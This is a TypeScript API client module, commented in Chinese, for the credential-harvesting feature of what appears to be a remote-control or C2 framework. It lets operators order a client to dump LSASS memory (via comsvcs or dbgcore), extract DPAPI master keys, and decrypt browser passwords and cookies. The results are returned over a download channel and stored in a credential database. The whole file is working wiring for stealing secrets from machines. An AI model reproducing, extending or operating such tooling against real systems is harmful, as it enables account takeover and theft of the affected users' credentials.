import request from '@/utils/request'

// 凭据获取（后端 pkg/api/cred.go，仅 admin/operator）
// 链路：发起 → 客户端获取制品 → 经下载通道回传 → 服务端校验并登记为制品。
//
// 三类制品（与服务端 cred.Kinds / 客户端核心 services/cred.go 一一对应）：
//   lsass   内存转储：二进制大制品，服务端只校验形态，操作员本地解析
//   dpapi   DPAPI 主密钥集（ZIP）：用户作用域已解密的 masterkey
//   browser 浏览器口令与 Cookie（JSON）：客户端内存解密，服务端自动入库到凭据库
export type CredKind = 'lsass' | 'dpapi' | 'browser'

export interface CredArtifactRequest {
  uid: string
  kind: string
  file_name: string
  tech: string
  format?: string
  task_id: number
  operator: string
  issued_at: string
  expires_at: string
}

export interface CredArtifact {
  id: number
  uid: string
  type: string
  source: string
  secret: string
  note: string
  created_at: string
}

// 每种类型可用的技术：**必须与服务端 cred.TechsFor 保持一致**，
// 否则界面能选、下发即 400。
export const CRED_TECHS: Record<CredKind, string[]> = {
  lsass: ['auto', 'comsvcs', 'dbgcore'],
  dpapi: ['keys'],
  browser: ['all', 'chrome', 'edge'],
}

// 类型 → 默认技术（与服务端 cred.DefaultTech 一致）
export function defaultTech(kind: CredKind): string {
  return CRED_TECHS[kind][0]
}

// 制品来源 → 中文/英文标签（制品列表里的类型徽标）
export function sourceLabel(source: string, isZh: boolean): string {
  switch (source) {
    case 'lsass':
      return isZh ? 'LSASS 转储' : 'LSASS dump'
    case 'dpapi':
      return isZh ? 'DPAPI 主密钥' : 'DPAPI keys'
    case 'browser':
      return isZh ? '浏览器凭据' : 'Browser creds'
    default:
      return source
  }
}

// 制品取回时的兜底文件名扩展名（真实文件名由服务端定义，这里只用于本地保存）
export function artifactExt(source: string): string {
  switch (source) {
    case 'dpapi':
      return '.zip'
    case 'browser':
      return '.json'
    default:
      return '.dmp'
  }
}

export default {
  dump(data: { uid: string; kind?: CredKind | string; tech?: string }) {
    return request({ url: '/cred/dump', method: 'POST', data })
  },
  listArtifacts(uid?: string) {
    return request({ url: '/cred/artifacts', method: 'GET', params: uid ? { uid } : {} })
  }
}
